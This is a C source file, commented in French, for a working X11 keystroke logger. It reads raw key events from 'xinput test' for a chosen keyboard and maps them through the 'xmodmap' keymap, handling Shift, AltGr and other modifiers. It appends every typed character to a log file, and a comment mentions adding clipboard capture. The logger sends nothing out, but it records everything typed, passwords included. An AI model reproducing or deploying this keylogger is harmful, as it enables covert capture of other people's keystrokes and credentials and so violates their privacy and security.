#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "main.h"
#include "liste.h"



/* poour la gestion du presse papier, voir la fonction gtk_clipboard_wait_for_text */

int main(int argc, char *argv[]){

	if (argc < 3 ){
		printf("Usage : %s id_du_clavier fichier_d_enregistrement -> xinput\n",argv[0]);
		return 0;
	}

	struct liste *liste_interuptions=NULL;

	/* lancement commande xinput*/
	int id = atoi(argv[1]);
	char commande[20];
	printf("l'id du clavier est %d\n", id);
	sprintf(commande,"xinput test %d",id);
	FILE *sortie;
	if((sortie = popen(commande,"r"))==NULL){ perror("impossible de lancer la commande xinput"); return 0;}


	/*ouverture fichier enregistrement*/
	printf("l'adresse du fichier de sauvegarde est %s\n",argv[2]);
	FILE *enregistrement;
	if((enregistrement = fopen(argv[2],"a"))==NULL) { perror("impossible d'ouvrir le fichier d'enregistrement"); return 0;}
	

	/*buffers*/
	char sortie_xinput[TAILLE_BUFF];
	int num;


		/* recuperation du keymap du clavier*/
	char keymap[256][3][TAILLE_BUFF];
	if(get_keymap(keymap)==-1){
		perror("Erreur dans la lecture du keymap");
		return (-1);
	}


	//lit une ligne, et mets dans la liste si Shift ou altgr, sinon imprime le charactere
	while (fgets(sortie_xinput,TAILLE_BUFF,sortie) != NULL) {
		if(sscanf(sortie_xinput,"key press %d", &num)==1){
			if ( est_charac(num,keymap)==0){
				ajoute(&liste_interuptions,num);
			}
			else {
				ajoute(&liste_interuptions,num);
				fprintliste(liste_interuptions,enregistrement,keymap);
				supprime(&liste_interuptions,num);
			}
		}
		else if (sscanf(sortie_xinput,"key release %d", &num)==1){
			if (est_charac(num,keymap)==0){
				supprime(&liste_interuptions,num);	
			}
		}
		fflush(enregistrement);
	}
	fclose(enregistrement);
	pclose(sortie);
	return 0;
}
//0 si la touche est alt, altgr,shift, ou super et 1 sinon
int est_charac(int carac,char keymap[][3][TAILLE_BUFF]){
int m = (strncmp(keymap[carac][0],"Shift",5) && strncmp(keymap[carac][0],"Super",5) 	&& 
		strncmp(keymap[carac][0],"Alt",4) && strncmp(keymap[carac][0],"ISO_Level3_Shift",16) &&
		strncmp(keymap[carac][0],"Control",6));
return m;
}


//recupere le keymap du clavier
int get_keymap(char keymap[][3][TAILLE_BUFF]){/* keymap[i]="string"*/
	FILE *map;
	map=popen("xmodmap -pke","r");
	int num;
	char attente[5*TAILLE_BUFF];//buff total
	char attent[TAILLE_BUFF];//buff du charactere de base
	char shift_attent[TAILLE_BUFF];//buff du shift
	char shit1[TAILLE_BUFF];//inutile
	char shit2[TAILLE_BUFF];//inutile
	char altgr_attent[TAILLE_BUFF];//buf du altgr


	if(map==NULL){
		perror("Can't launch the command");
		return (-1);
	}
	
	while (fgets(attente,5*TAILLE_BUFF,map)!=NULL) {
		if (sscanf(attente,"keycode %d = %s %s %s %s %s",&num,attent,shift_attent,shit1,shit2,altgr_attent)>=1 && num<256 && num>0){
			memcpy(keymap[num][1],shift_attent,TAILLE_BUFF);
			memcpy(keymap[num][0],attent,TAILLE_BUFF);
			memcpy(keymap[num][2],altgr_attent,TAILLE_BUFF);
		}
	}
		
	pclose(map);
	return 0;
	}